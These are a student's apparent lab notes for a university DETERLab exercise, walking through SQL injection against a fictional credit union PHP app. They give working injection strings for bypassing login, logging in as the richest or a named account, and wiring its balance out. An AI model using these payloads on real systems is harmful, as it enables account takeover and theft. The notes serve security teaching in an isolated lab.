Part 3: SQL Injection -- FrobozzCo Credit Union

	FrobozzCo has its own internal company credit union, FrobozzCo Community Credit Union (FCCU). FCCU has an Internet-accessible web-based application that allows employees to access their paychecks and pay bills via a money wiring system. There are very few bank employees, and they use a a special administrative interface that runs on a different system that is not network accessible. In true FrobozzCo fashion, the public banking software was written in house by the CTO's nephew (who is a nice kid but not the brightest candle on the cake).

	As it turns out, a lot of money has been disappearing from the credit union while you've been gone. It looks like someone has figured out how to force other accounts to wire money... to an anonymous bank account in the Cayman Islands! Worse yet, several employees have had serious identity theft problems of late -- clearly someone has access to personal information and you have a hunch it's all coming from this server. To top it all off, the company itself is showing a deficit of $32,767 and it looks like it was somehow drawn through FCCU.

	In a surprising display of foresight, your predecessor installed a network monitor watching the FCCU server. However, you are shocked to find out (from the network monitor and server logs) that nobody has logged into the server directly -- in fact, the only interaction that anyone has had with the server has come through the Internet facing web interface. It looks like insecure software is to blame, again.

	You assume that there must be one or more vulnerabilities in the code that interfaces with the SQL database -- in the FCCU software, the directory, or both -- and that somehow a malicious user is able to make the system do something it's not supposed to, like write checks. Worse yet, it seems like the attacker has managed to view private information like social security numbers, birthdates, and so on. You've heard about a class of attacks called "SQL Injection," and it seems likely that this is the kind of exploit being used.

	Surprisingly, your boss agrees with you and instructs you to produce a one page memo, a detailed transcript demonstrating the exploit, and a patch for the software. Additionally, he also wants to know how to clean up this mess -- how severe is the compromise? How can we restore the system to a safe state?


	SQL Injection Tasks

		Load your Exploits image in DETER. (You don't need to reload it if it is already active.)
		The sourcecode is located at /var/www/cgi-bin/FCCU.php
		If you have set up ssh tunnelling via port 8080 (a good idea), the memo application can be accessed at http://localhost:8080/cgi-bin/FCCU.php
		Exercise a remote SQL-Injection vulnerability to perform these unauthorized tasks on the SQL server:
		Show how you can log into a single account without knowing any id numbers ahead of time.
		Show how you can log into any account you like (without knowing any id numbers ahead of time).
		Make some account (your choice) wire its total balance to the bank with routing number: 314159265 and account number: 271828182845
		Explain why you can't create a new account or arbitrarily update account balances (or show that you can).
		Create an exploit transcript in the file /root/exploit3.txt, including your answers and how you completed the above attacks.
		document all SQL Injection strings you used, including which pages and in what order.
		This is not an executable script, but should be a step-by-step "walkthrough" of the attack that a colleague could follow without assistance.
		Fix the vulnerability in the FCCU application by adding input validation and either character escaping or prepared statements.
		Create a patch against the original source.
		Quoting as little sourcecode as possible, write a ~1 page memo, including:
		A description of the security flaw in the FCCU application
		A description of how you fixed the flaw. How does your fix solve the problem?
		Considering the FCCU application alone, describe a recovery plan for the server, answering:
		How serious was this breach? Could attackers gain root access through this vulnerability?
		What should be done with the server in order to secure it?
		Include any other observations or thoughts you might have.
		Store the following files in /root/part3:
		your memo
		your exploit walkthrough
		your patch
		Use the scripts described in the section for creating a submission tarball.

	Logon to ssh tunnel

	sudo su -
	apt-get install gdb
	cd /./usr/src/fhttpd/server
	gdb webserver

	open browser
	http://localhost:8118/cgi-bin/FCCU.php

	Looking at FCCP.php

		Get username and password from form
			Check if account exists		$query = "SELECT * FROM accounts WHERE id = $id AND password = '$password'";
			Get account info		$query = "SELECT * FROM accounts WHERE id = $id AND password = '$password'";
			Get list of users		$query = "SELECT first, last FROM accounts ORDER BY last";

		name_to_id($name)
			Get user from usernames		$query = "SELECT id FROM accounts WHERE first = '$splitname[1]' AND last = '$splitname[0]'";

		withdraw_cash($id, $password, $amount)
			Check balance for user		$query = "SELECT bal FROM accounts WHERE password = '$password' AND id = $id";
			Lower balance by amount		$query = "UPDATE accounts SET bal = $giver_has WHERE password = '$password' AND id = $id LIMIT 1";

		function transfer_funds($giver_id, $password, $recipient, $amount)
			$query = "SELECT bal FROM accounts WHERE id = $giver_id OR id = $recipient_id";
			$query = "UPDATE accounts SET bal = $recipient_has WHERE id = $recipient_id LIMIT 1";
			$query = "UPDATE accounts SET bal = $giver_has WHERE password = '$password' AND id = $giver_id LIMIT 1";

		function wire_funds($id, $password,  $bank, $account, $amount)
			$query = "SELECT bal FROM accounts WHERE password = '$password' AND id = $id";
			$query = "UPDATE accounts SET bal = $giver_has WHERE password = '$password' AND id = $id LIMIT 1";

					

	Exercise a remote SQL-Injection vulnerability to perform these unauthorized tasks on the SQL server:

		Show how you can log into a single account without knowing any id numbers ahead of time.
			assuming numerical ids (no quotes)
				login to form
				$id = "0"
				$password = "' OR ''='"
				Creates the Query
					$query = "SELECT * FROM accounts WHERE id = 0 AND password = '' OR ''=''";
				Since no account with id=0 and password = '' exists, and "''=''" is always true, this is equivalent to
					$query = "SELECT * FROM accounts";
				Since the top 1 account is selected from the query, this will return the first account it can find

			alternatively, go for the account with the most money
				login to form
				$id = "0"
				$password = "' OR bal IN (select MAX(bal) FROM accounts) AND '' = '"
				Creates the Query
					$query = "SELECT * FROM accounts WHERE id = 0 AND password = '' OR bal IN (select MAX(bal) FROM accounts) AND '' = ''";
				Since no account with id=0 and password = '' exists, and "''=''" is always true, this is equivalent to
					$query = "SELECT * FROM accounts WHERE bal IN (select MAX(bal) FROM accounts)";
				Since the top 1 account is selected from the query, this will return the first account it can find that has a balance equal to the person with the highest balance in the system. If there are multiple people with the top balance, it will login as the first one, otherwise, it will just login as the person with the highest balance.

		Show how you can log into any account you like (without knowing any id numbers ahead of time).
			Now that I logged in, I found that the person with the most money was BYRON BUSH, id = 1958. I can now login with his first and last name.
			You can find the full list of users by logging in and checking out list of employees in "Transfer Money", but we already logged into the person with the most money.
				login to form
				$id = "0"
				$password = "' OR first='BYRON' AND last='BUSH"
				Creates the Query
					$query = "SELECT * FROM accounts WHERE id = 0 AND password = '' OR first='BYRON' AND last='BUSH'";
				Since no account with id=0 and password = '' exists, this is equivalent to
					$query = "SELECT * FROM accounts WHERE first='BYRON' AND last='BUSH'";
				Since the top 1 account is selected from the query, this will return the first account it can find that has a the first name of "BYRON" and the last name of "BUSH".

		Make some account (your choice) wire its total balance to the bank with routing number: 314159265 and account number: 271828182845
			might as well go for the account with the most money.
			Since "password" and "id" are switched, we can't just use the old values for "id" and "password". To remedy this, I'm selecting the ID associated with BYRON BUSH.
			Also the "MAX" function doesn't work for update commands,
				login to form
					$id = "1958"
					$password = "' OR first='BYRON' AND last='BUSH"
				Creates the Query
					$query = "SELECT * FROM accounts WHERE id = 1958 AND password = '' OR first='BYRON' AND last='BUSH'";
				Since no account with id=0 and password = '' exists, this is equivalent to
					$query = "SELECT * FROM accounts WHERE first='BYRON' AND last='BUSH'";
				Since the top 1 account is selected from the query, this will return the first account it can find that has a the first name of "BYRON" and the last name of "BUSH".

				After logging in, fill in the fields for wire funds. The balance listed was "$14157" so
				wire_funds
					$bank = "314159265"
					$account = "271828182845"
					$amount = "14157"
				Creates the Query
					$query = "SELECT bal FROM accounts WHERE password = '' OR first='BYRON' AND last='BUSH' AND id = 1958";
				Since no account with password = '' exists, this is equivalent to
					$query = "SELECT bal FROM accounts WHERE first='BYRON' AND last='BUSH' AND id = 1958";
				Since the "bal" is 14157, we take all that money and transfer it to
					$bank = "314159265"
					$account = "271828182845"
				This will send a message to accounting to cut a check to the bank account.
				Then, it will update the account with a stored value 14157-14157 = 0
					$query = "UPDATE accounts SET bal = 0 WHERE password = '' OR first='BYRON' AND last='BUSH' AND id = 1958 LIMIT 1";
				Since no account with password = '' exists, this is equivalent to
					$query = "UPDATE accounts SET bal = 0 WHERE first='BYRON' AND last='BUSH' AND id = 1958 LIMIT 1";

		Explain why you can't create a new account or arbitrarily update account balances (or show that you can).
			You can't. This version of MySQL does not allow for the ";" input, so you can't execute multiple calls
			Of the queries available to use, to execute an update or insert query, the desired query to inject into has to be an update or insert query already.
			There are no "insert" queries so that functionality can't be executed.
			As for the update functionality, there are in fact several update queries in the database.
			
			withdraw_cash($id, $password, $amount)
				$query = "UPDATE accounts SET bal = $giver_has WHERE password = '$password' AND id = $id LIMIT 1";
			function transfer_funds($giver_id, $password, $recipient, $amount)
				$query = "UPDATE accounts SET bal = $recipient_has WHERE id = $recipient_id LIMIT 1";
				$query = "UPDATE accounts SET bal = $giver_has WHERE password = '$password' AND id = $giver_id LIMIT 1";
			function wire_funds($id, $password,  $bank, $account, $amount)
				$query = "UPDATE accounts SET bal = $giver_has WHERE password = '$password' AND id = $id LIMIT 1";
				
			There is a problem with the selected functions is that they validate the numbers first.
			With withdraw_cash and wire_funds, the resulting balance must have a minimum of 0 or a maximum of the original results. It also alerts accounting.
			transfer_funds can only move the amount of money from other accounts, and it also has a money limit.
			You can't transfer to yourself to circumvent this as 2 different ids are needed.
				
::Run on cmd.exe to copy part 3 to local directory
"C:\Program Files (x86)\Putty\pscp.exe" "nv8476am@users.deterlab.net:/users/nv8476am/exploits/part3/*.*" "C:\Users\thoma_000\Documents\Grad School\Cryptography\Lab 2\part3"

::Run on cmd.exe to copy part 3 from local directory
"C:\Program Files (x86)\Putty\pscp.exe" "C:\Users\thoma_000\Documents\Grad School\Cryptography\Lab 2\part3\*.*" "nv8476am@users.deterlab.net:/users/nv8476am/exploits/part3"

This part took about 15 hours of work.